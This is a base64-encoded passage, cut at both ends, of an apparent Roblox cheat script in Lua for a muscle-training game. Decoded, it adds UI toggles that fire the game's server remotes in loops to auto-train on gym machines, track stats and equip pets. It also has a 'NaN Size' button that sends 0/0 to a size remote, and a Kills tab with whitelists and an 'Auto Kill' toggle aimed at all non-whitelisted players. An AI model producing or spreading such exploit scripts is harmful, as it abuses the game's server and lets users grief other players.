aGluZUFjdGl2ZSA9IHRydWUKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKLS0gRnVuY3Rpb24gdG8gc3RvcCB1c2luZyBtYWNoaW5lCmxvY2FsIGZ1bmN0aW9uIHN0b3BNYWNoaW5lKCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgaWYgY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgY2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZC5KdW1wID0gdHJ1ZQogICAgICAgICAgICBjdXJyZW50TWFjaGluZSA9IG5pbAogICAgICAgICAgICBjdXJyZW50TWFjaGluZUFjdGl2ZSA9IGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKLS0gRnVuY3Rpb24gdG8gZG8gcmVwcyBvbiBjdXJyZW50IG1hY2hpbmUKbG9jYWwgZnVuY3Rpb24gZG9NYWNoaW5lUmVwcygpCiAgICBpZiBjdXJyZW50TWFjaGluZUFjdGl2ZSBhbmQgY3VycmVudE1hY2hpbmUgdGhlbgogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgbWFjaGluZSA9IHdvcmtzcGFjZS5tYWNoaW5lc0ZvbGRlcjpGaW5kRmlyc3RDaGlsZChjdXJyZW50TWFjaGluZSkKICAgICAgICAgICAgaWYgbWFjaGluZSBhbmQgbWFjaGluZTpGaW5kRmlyc3RDaGlsZCgiaW50ZXJhY3RTZWF0IikgdGhlbgogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMubWFjaGluZUludGVyYWN0UmVtb3RlOkludm9rZVNlcnZlcigidXNlTWFjaGluZSIsIG1hY2hpbmUuaW50ZXJhY3RTZWF0KQogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIiwgbWFjaGluZS5pbnRlcmFjdFNlYXQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAplbmQKCi0tIE1hY2hpbmUgVG9nZ2xlIENyZWF0b3IgRnVuY3Rpb24KbG9jYWwgZnVuY3Rpb24gY3JlYXRlTWFjaGluZVRvZ2dsZShwYXJlbnQsIHRpdGxlLCBtYWNoaW5lTmFtZSwgc3RhdGVWYXIpCiAgICBwYXJlbnQ6VG9nZ2xlKHsKICAgICAgICBUaXRsZSA9IHRpdGxlLAogICAgICAgIERlc2MgPSAiQXV0byB1c2UgIiAuLiBtYWNoaW5lTmFtZSwKICAgICAgICBWYWx1ZSA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIHN0YXRlVmFyID0gc3RhdGUKICAgICAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICAgICAgc3RvcE1hY2hpbmUoKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgIHNldHVwTWFjaGluZShtYWNoaW5lTmFtZSkKICAgICAgICAgICAgICAgIHdoaWxlIHN0YXRlVmFyIGFuZCBjdXJyZW50TWFjaGluZSA9PSBtYWNoaW5lTmFtZSBkbwogICAgICAgICAgICAgICAgICAgIGRvTWFjaGluZVJlcHMoKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAxKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGlmIGN1cnJlbnRNYWNoaW5lID09IG1hY2hpbmVOYW1lIHRoZW4KICAgICAgICAgICAgICAgICAgICBzdG9wTWFjaGluZSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQplbmQKCi0tIFRpbnkgR3ltIFNlY3Rpb24KR3ltVGFiOlNlY3Rpb24oe1RpdGxlID0gIvCfj6AgVGlueSBHeW0ifSkKbG9jYWwgdGlueUJlbmNoLCB0aW55U3F1YXQsIHRpbnlQdWxsdXBzLCB0aW55RGVhZGxpZnQgPSBmYWxzZSwgZmFsc2UsIGZhbHNlLCBmYWxzZQoKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJCZW5jaCBQcmVzcyIsICJCZW5jaCBQcmVzcyIsIHRpbnlCZW5jaCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJTcXVhdCBSYWNrIiwgIlNxdWF0IFJhY2siLCB0aW55U3F1YXQpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiUHVsbHVwcyIsICJQdWxsdXBzIiwgdGlueVB1bGx1cHMpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiRGVhZGxpZnQiLCAiRGVhZGxpZnQiLCB0aW55RGVhZGxpZnQpCgotLSBGcm9zdCBHeW0gU2VjdGlvbgpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAi4p2E77iPIEZyb3N0IEd5bSJ9KQpsb2NhbCBmcm9zdFByZXNzLCBmcm9zdExpZnQsIGZyb3N0U3F1YXQsIGZyb3N0Qm91bGRlciA9IGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlCgpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkZyb3N0IFByZXNzIiwgIkZyb3N0IFByZXNzIiwgZnJvc3RQcmVzcykKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJGcm9zdCBMaWZ0IiwgIkZyb3N0IExpZnQiLCBmcm9zdExpZnQpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiRnJvc3QgU3F1YXQiLCAiRnJvc3QgU3F1YXQiLCBmcm9zdFNxdWF0KQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkJvdWxkZXIgVGhyb3ciLCAiQm91bGRlciBUaHJvdyIsIGZyb3N0Qm91bGRlcikKCi0tIE15dGhpY2FsIEd5bSBTZWN0aW9uCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICLinKggTXl0aGljYWwgR3ltIn0pCmxvY2FsIG15dGhpY2FsUHJlc3MsIG15dGhpY2FsUHVsbHVwLCBteXRoaWNhbFRocm93ID0gZmFsc2UsIGZhbHNlLCBmYWxzZQoKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJNeXRoaWNhbCBQcmVzcyIsICJNeXRoaWNhbCBQcmVzcyIsIG15dGhpY2FsUHJlc3MpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTXl0aGljYWwgUHVsbHVwIiwgIk15dGhpY2FsIFB1bGx1cCIsIG15dGhpY2FsUHVsbHVwKQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIk15dGhpY2FsIFRocm93IiwgIk15dGhpY2FsIFRocm93IiwgbXl0aGljYWxUaHJvdykKCi0tIEluZmVybm8gR3ltIFNlY3Rpb24KR3ltVGFiOlNlY3Rpb24oe1RpdGxlID0gIvCflKUgSW5mZXJubyBHeW0ifSkKbG9jYWwgZXRlcm5hbFByZXNzID0gZmFsc2UKCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiRXRlcm5hbCBQcmVzcyIsICJFdGVybmFsIFByZXNzIiwgZXRlcm5hbFByZXNzKQoKLS0gTGVnZW5kcyBHeW0gU2VjdGlvbgpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAi8J+MnyBMZWdlbmRzIEd5bSJ9KQpsb2NhbCBsZWdlbmRzUHJlc3MsIGxlZ2VuZHNMaWZ0LCBsZWdlbmRzU3F1YXQsIGxlZ2VuZHNQdWxsdXAsIGxlZ2VuZHNUaHJvdyA9IGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlLCBmYWxzZQoKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJMZWdlbmRzIFByZXNzIiwgIkxlZ2VuZHMgUHJlc3MiLCBsZWdlbmRzUHJlc3MpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTGVnZW5kcyBMaWZ0IiwgIkxlZ2VuZHMgTGlmdCIsIGxlZ2VuZHNMaWZ0KQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkxlZ2VuZHMgU3F1YXQiLCAiTGVnZW5kcyBTcXVhdCIsIGxlZ2VuZHNTcXVhdCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJMZWdlbmRzIFB1bGx1cCIsICJMZWdlbmRzIFB1bGx1cCIsIGxlZ2VuZHNQdWxsdXApCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTGVnZW5kcyBUaHJvdyIsICJMZWdlbmRzIFRocm93IiwgbGVnZW5kc1Rocm93KQoKLS0gTXVzY2xlIEtpbmcgR3ltIFNlY3Rpb24KR3ltVGFiOlNlY3Rpb24oe1RpdGxlID0gIvCfkZEgTXVzY2xlIEtpbmcgR3ltIn0pCmxvY2FsIGtpbmdCZW5jaCwga2luZ0xpZnQsIGtpbmdTcXVhdCwga2luZ01vdW50YWluLCBraW5nQm91bGRlciA9IGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlLCBmYWxzZQoKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJNdXNjbGUgS2luZyBCZW5jaCIsICJNdXNjbGUgS2luZyBCZW5jaCIsIGtpbmdCZW5jaCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJNdXNjbGUgS2luZyBMaWZ0IiwgIk11c2NsZSBLaW5nIExpZnQiLCBraW5nTGlmdCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJNdXNjbGUgS2luZyBTcXVhdCIsICJNdXNjbGUgS2luZyBTcXVhdCIsIGtpbmdTcXVhdCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJNdXNjbGUgS2luZyBNb3VudGFpbiIsICJNdXNjbGUgS2luZyBNb3VudGFpbiIsIGtpbmdNb3VudGFpbikKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJLaW5nIEJvdWxkZXIiLCAiS2luZyBCb3VsZGVyIiwga2luZ0JvdWxkZXIpCgotLSBKdW5nbGUgR3ltIFNlY3Rpb24KR3ltVGFiOlNlY3Rpb24oe1RpdGxlID0gIvCfjLQgSnVuZ2xlIEd5bSJ9KQpsb2NhbCBqdW5nbGVCZW5jaCwganVuZ2xlTGlmdCwganVuZ2xlU3F1YXQsIGp1bmdsZUJvdWxkZXIgPSBmYWxzZSwgZmFsc2UsIGZhbHNlLCBmYWxzZQoKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJKdW5nbGUgQmVuY2giLCAiSnVuZ2xlIEJlbmNoIiwganVuZ2xlQmVuY2gpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiSnVuZ2xlIEJhciBMaWZ0IiwgIkp1bmdsZSBCYXIgTGlmdCIsIGp1bmdsZUxpZnQpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiSnVuZ2xlIFNxdWF0IiwgIkp1bmdsZSBTcXVhdCIsIGp1bmdsZVNxdWF0KQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkp1bmdsZSBCb3VsZGVyIiwgIkp1bmdsZSBCb3VsZGVyIiwganVuZ2xlQm91bGRlcikKCi0tIFN0YXRzIFRhYgpsb2NhbCBTdGF0c1RhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIlN0YXRzIiwgSWNvbiA9ICJhY3Rpdml0eSJ9KQoKLS0gU2Vzc2lvbiBUaW1lciBTZWN0aW9uClN0YXRzVGFiOlNlY3Rpb24oe1RpdGxlID0gIlNlc3Npb24gVGltZXIifSkKbG9jYWwgdGltZXJMYWJlbCA9IFN0YXRzVGFiOkxhYmVsKHtUaXRsZSA9ICLij7AgVElNRSIsIERlc2MgPSAiMHMgMG0gMGggMGQifSkKCnRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgbG9jYWwgc3RhcnRUaW1lID0gdGljaygpCiAgICAKICAgIHdoaWxlIHRhc2sud2FpdCgxKSBkbwogICAgICAgIGxvY2FsIGVsYXBzZWQgPSB0aWNrKCkgLSBzdGFydFRpbWUKICAgICAgICAKICAgICAgICBsb2NhbCBzZWNvbmRzID0gbWF0aC5mbG9vcihlbGFwc2VkICUgNjApCiAgICAgICAgbG9jYWwgbWludXRlcyA9IG1hdGguZmxvb3IoKGVsYXBzZWQgLyA2MCkgJSA2MCkgCiAgICAgICAgbG9jYWwgaG91cnMgPSBtYXRoLmZsb29yKChlbGFwc2VkIC8gMzYwMCkgJSAyNCkKICAgICAgICBsb2NhbCBkYXlzID0gbWF0aC5mbG9vcihlbGFwc2VkIC8gODY0MDApCiAgICAgICAgCiAgICAgICAgdGltZXJMYWJlbDpTZXREZXNjKHN0cmluZy5mb3JtYXQoIiVkcyAlZG0gJWRoICVkZCIsIHNlY29uZHMsIG1pbnV0ZXMsIGhvdXJzLCBkYXlzKSkKICAgIGVuZAplbmQpCgotLSBTdGF0cyBEaXNwbGF5IFNlY3Rpb24KU3RhdHNUYWI6U2VjdGlvbih7VGl0bGUgPSAi8J+TiiBTVEFUUyJ9KQoKLS0gSGVscGVyIGZ1bmN0aW9uIHRvIGZvcm1hdCBudW1iZXJzCmxvY2FsIGZ1bmN0aW9uIGZvcm1hdE51bWJlcih2YWx1ZSkKICAgIGxvY2FsIHJhd0Zvcm1hdHRlZCA9IHRvc3RyaW5nKHZhbHVlKTpyZXZlcnNlKCk6Z3N1YigiJWQlZCVkIiwgIiUxLCIpOnJldmVyc2UoKTpnc3ViKCJeLCIsICIiKQogICAgCiAgICBsb2NhbCBhYmJyZXZpYXRlZCA9ICIiCiAgICBpZiB2YWx1ZSA+PSAxMDAwMDAwMDAwMDAwMDAwMDAwIHRoZW4KICAgICAgICBhYmJyZXZpYXRlZCA9IHN0cmluZy5mb3JtYXQoIiUuMWZRaSIsIHZhbHVlIC8gMTAwMDAwMDAwMDAwMDAwMDAwMCkKICAgIGVsc2VpZiB2YWx1ZSA+PSAxMDAwMDAwMDAwMDAwMDAwIHRoZW4KICAgICAgICBhYmJyZXZpYXRlZCA9IHN0cmluZy5mb3JtYXQoIiUuMWZRYSIsIHZhbHVlIC8gMTAwMDAwMDAwMDAwMDAwMCkKICAgIGVsc2VpZiB2YWx1ZSA+PSAxMDAwMDAwMDAwMDAwIHRoZW4KICAgICAgICBhYmJyZXZpYXRlZCA9IHN0cmluZy5mb3JtYXQoIiUuMWZUIiwgdmFsdWUgLyAxMDAwMDAwMDAwMDAwKQogICAgZWxzZWlmIHZhbHVlID49IDEwMDAwMDAwMDAgdGhlbgogICAgICAgIGFiYnJldmlhdGVkID0gc3RyaW5nLmZvcm1hdCgiJS4xZkIiLCB2YWx1ZSAvIDEwMDAwMDAwMDApCiAgICBlbHNlaWYgdmFsdWUgPj0gMTAwMDAwMCB0aGVuCiAgICAgICAgYWJicmV2aWF0ZWQgPSBzdHJpbmcuZm9ybWF0KCIlLjFmTSIsIHZhbHVlIC8gMTAwMDAwMCkKICAgIGVsc2VpZiB2YWx1ZSA+PSAxMDAwIHRoZW4KICAgICAgICBhYmJyZXZpYXRlZCA9IHN0cmluZy5mb3JtYXQoIiUuMWZLIiwgdmFsdWUgLyAxMDAwKQogICAgZWxzZQogICAgICAgIGFiYnJldmlhdGVkID0gdG9zdHJpbmcodmFsdWUpCiAgICBlbmQKICAgIAogICAgcmV0dXJuIHJhd0Zvcm1hdHRlZCwgYWJicmV2aWF0ZWQKZW5kCgotLSBIZWxwZXIgZnVuY3Rpb24gdG8gY3JlYXRlIHN0YXQgZGlzcGxheQpsb2NhbCBmdW5jdGlvbiBjcmVhdGVTdGF0RGlzcGxheShzdGF0TmFtZSwgZW1vamksIHN0YXRQYXRoLCBpc0xlYWRlcnN0YXQpCiAgICBsb2NhbCBsYWJlbCA9IFN0YXRzVGFiOkxhYmVsKHtUaXRsZSA9IGVtb2ppIC4uICIgIiAuLiBzdGF0TmFtZSwgRGVzYyA9ICIwICgwKSB8IEdBSU5FRDogMCAoMCkifSkKICAgIGxvY2FsIHN0YXJ0VmFsdWUgPSBpc0xlYWRlcnN0YXQgYW5kIAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5sZWFkZXJzdGF0c1tzdGF0UGF0aF0uVmFsdWUgb3IgCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyW3N0YXRQYXRoXS5WYWx1ZQogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSB0YXNrLndhaXQoMSkgZG8KICAgICAgICAgICAgbG9jYWwgY3VycmVudFZhbHVlID0gaXNMZWFkZXJzdGF0IGFuZCAKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5sZWFkZXJzdGF0c1tzdGF0UGF0aF0uVmFsdWUgb3IgCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXJbc3RhdFBhdGhdLlZhbHVlCiAgICAgICAgICAgIGxvY2FsIGdhaW5lZCA9IGN1cnJlbnRWYWx1ZSAtIHN0YXJ0VmFsdWUKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGN1cnJlbnRSYXcsIGN1cnJlbnRBYmJyID0gZm9ybWF0TnVtYmVyKGN1cnJlbnRWYWx1ZSkKICAgICAgICAgICAgbG9jYWwgZ2FpbmVkUmF3LCBnYWluZWRBYmJyID0gZm9ybWF0TnVtYmVyKGdhaW5lZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGxhYmVsOlNldERlc2Moc3RyaW5nLmZvcm1hdCgiJXMgKCVzKSB8IEdBSU5FRDogJXMgKCVzKSIsIAogICAgICAgICAgICAgICAgY3VycmVudFJhdywgY3VycmVudEFiYnIsIGdhaW5lZFJhdywgZ2FpbmVkQWJicikpCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIHJldHVybiBsYWJlbAplbmQKCi0tIENyZWF0ZSBhbGwgc3RhdCBkaXNwbGF5cwpjcmVhdGVTdGF0RGlzcGxheSgiU3RyZW5ndGgiLCAi8J+SqiIsICJTdHJlbmd0aCIsIHRydWUpCmNyZWF0ZVN0YXREaXNwbGF5KCJEdXJhYmlsaXR5IiwgIvCfm6HvuI8iLCAiRHVyYWJpbGl0eSIsIGZhbHNlKQpjcmVhdGVTdGF0RGlzcGxheSgiQWdpbGl0eSIsICLimqEiLCAiQWdpbGl0eSIsIGZhbHNlKQpjcmVhdGVTdGF0RGlzcGxheSgiUmViaXJ0aHMiLCAi8J+UhCIsICJSZWJpcnRocyIsIHRydWUpCmNyZWF0ZVN0YXREaXNwbGF5KCJCcmF3bHMiLCAi8J+liiIsICJCcmF3bHMiLCB0cnVlKQpjcmVhdGVTdGF0RGlzcGxheSgiS2lsbHMiLCAi8J+SgCIsICJLaWxscyIsIHRydWUpCmNyZWF0ZVN0YXREaXNwbGF5KCJHb29kIEthcm1hIiwgIvCfmIciLCAiZ29vZEthcm1hIiwgZmFsc2UpCmNyZWF0ZVN0YXREaXNwbGF5KCJFdmlsIEthcm1hIiwgIvCfmIgiLCAiZXZpbEthcm1hIiwgZmFsc2UpCgotLSBLaWxscyBUYWIKbG9jYWwgS2lsbHNUYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJLaWxscyIsIEljb24gPSAidGFyZ2V0In0pCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIHBsYXllcldoaXRlbGlzdCA9IHt9CmxvY2FsIHRhcmdldFBsYXllck5hbWVzID0ge30KbG9jYWwgYXV0b0tpbGwgPSBmYWxzZQpsb2NhbCBraWxsVGFyZ2V0ID0gZmFsc2UKbG9jYWwgc3B5aW5nID0gZmFsc2UKbG9jYWwgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UKbG9jYWwgdGFyZ2V0RHJvcGRvd25JdGVtcyA9IHt9CmxvY2FsIGZyaWVuZFdoaXRlbGlzdEFjdGl2ZSA9IGZhbHNlCmxvY2FsIGdvZE1vZGVUb2dnbGUgPSBmYWxzZQpsb2NhbCBmb2xsb3dpbmcgPSBmYWxzZQpsb2NhbCBmb2xsb3dUYXJnZXQgPSBuaWwKbG9jYWwgZ29kRGFtYWdlQWN0aXZlID0gZmFsc2UKCi0tIFBldCBTZWxlY3Rpb24gU2VjdGlvbgpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJFcXVpcCBQZXRzIn0pCgpsb2NhbCBwZXREcm9wZG93biA9IEtpbGxzVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlNlbGVjdCBQZXQiLAogICAgTGlzdCA9IHsiV2lsZCBXaXphcmQiLCAiTWlnaHR5IE1vbnN0ZXIifSwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgbG9jYWwgcGV0c0ZvbGRlciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5wZXRzRm9sZGVyCiAgICAgICAgZm9yIF8sIGZvbGRlciBpbiBwYWlycyhwZXRzRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIGZvbGRlcjpJc0EoIkZvbGRlciIpIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCBwZXQgaW4gcGFpcnMoZm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMuZXF1aXBQZXRFdmVudDpGaXJlU2VydmVyKCJ1bmVxdWlwUGV0IiwgcGV0KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgwLjIpCgogICAgICAgIGxvY2FsIHBldE5hbWUgPSB0ZXh0CiAgICAgICAgbG9jYWwgcGV0c1RvRXF1aXAgPSB7fQoKICAgICAgICBmb3IgXywgcGV0IGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5wZXRzRm9sZGVyLlVuaXF1ZTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBwZXQuTmFtZSA9PSBwZXROYW1lIHRoZW4KICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChwZXRzVG9FcXVpcCwgcGV0KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgbWF4UGV0cyA9IDgKICAgICAgICBsb2NhbCBlcXVpcHBlZENvdW50ID0gbWF0aC5taW4oI3BldHNUb0VxdWlwLCBtYXhQZXRzKQoKICAgICAgICBmb3IgaSA9IDEsIGVxdWlwcGVkQ291bnQgZG8KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMuZXF1aXBQZXRFdmVudDpGaXJlU2VydmVyKCJlcXVpcFBldCIsIHBldHNUb0VxdWlwW2ldKQogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBVdGlsaXR5IFNlY3Rpb24KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiVXRpbGl0eSJ9KQoKS2lsbHNUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIk5hTiBTaXplIiwKICAgIERlc2MgPSAiU2V0IGNoYXJhY3RlciBzaXplIHRvIE5hTiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBhcmdzID0geyJjaGFuZ2VTaXplIiwgMC8wfQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoInJFdmVudHMiKTpXYWl0Rm9yQ2hpbGQoImNoYW5nZVNwZWVkU2l6ZVJlbW90ZSIpOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICBlbmQKfSkKCi0tIFdoaXRlbGlzdCBNYW5hZ2VtZW50IFNlY3Rpb24KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiV2hpdGVsaXN0IE1hbmFnZW1lbnQifSkKCktpbGxzVGFiOlRleHRib3goewogICAgVGl0bGUgPSAiV2hpdGVsaXN0IFBsYXllciIsCiAgICBEZXNjID0gIkFkZCBwbGF5ZXIgdG8gd2hpdGVsaXN0IiwKICAgIFBsYWNlaG9sZGVyID0gIlBsYXllciBOYW1lIiwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZCh0ZXh0KQogICAgICAgIGlmIHRhcmdldCB0aGVuCiAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFt0YXJnZXQuTmFtZV0gPSB0cnVlCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCktpbGxzVGFiOlRleHRib3goewogICAgVGl0bGUgPSAiVW5XaGl0ZWxpc3QgUGxheWVyIiwKICAgIERlc2MgPSAiUmVtb3ZlIHBsYXllciBmcm9tIHdoaXRlbGlzdCIsCiAgICBQbGFjZWhvbGRlciA9ICJQbGF5ZXIgTmFtZSIsCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQodGV4dCkKICAgICAgICBpZiB0YXJnZXQgdGhlbgogICAgICAgICAgICBwbGF5ZXJXaGl0ZWxpc3RbdGFyZ2V0Lk5hbWVdID0gbmlsCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCktpbGxzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFdoaXRlbGlzdCBGcmllbmRzIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSB3aGl0ZWxpc3QgZnJpZW5kcyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBmcmllbmRXaGl0ZWxpc3RBY3RpdmUgPSBzdGF0ZQoKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIGFuZCBMb2NhbFBsYXllcjpJc0ZyaWVuZHNXaXRoKHBsYXllci5Vc2VySWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICBwbGF5ZXJXaGl0ZWxpc3RbcGxheWVyLk5hbWVdID0gdHJ1ZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgICAgICAgICAgICAgIGlmIGZyaWVuZFdoaXRlbGlzdEFjdGl2ZSBhbmQgcGxheWVyIH49IExvY2FsUGxheWVyIGFuZCBMb2NhbFBsYXllcjpJc0ZyaWVuZHNXaXRoKHBsYXllci5Vc2VySWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICBwbGF5ZXJXaGl0ZWxpc3RbcGxheWVyLk5hbWVdID0gdHJ1ZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGZvciBuYW1lIGluIHBhaXJzKHBsYXllcldoaXRlbGlzdCkgZG8KICAgICAgICAgICAgICAgIGxvY2FsIGZyaWVuZCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQobmFtZSkKICAgICAgICAgICAgICAgIGlmIGZyaWVuZCBhbmQgTG9jYWxQbGF5ZXI6SXNGcmllbmRzV2l0aChmcmllbmQuVXNlcklkKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcGxheWVyV2hpdGVsaXN0W25hbWVdID0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEF1dG8gS2lsbCBTZWN0aW9uCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkF1dG8gS2lsbCJ9KQoKS2lsbHNUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gS2lsbCIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkga2lsbCBhbGwgbm9uLXdoaXRlbGlzdGVkIHBsYXllcnMiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYW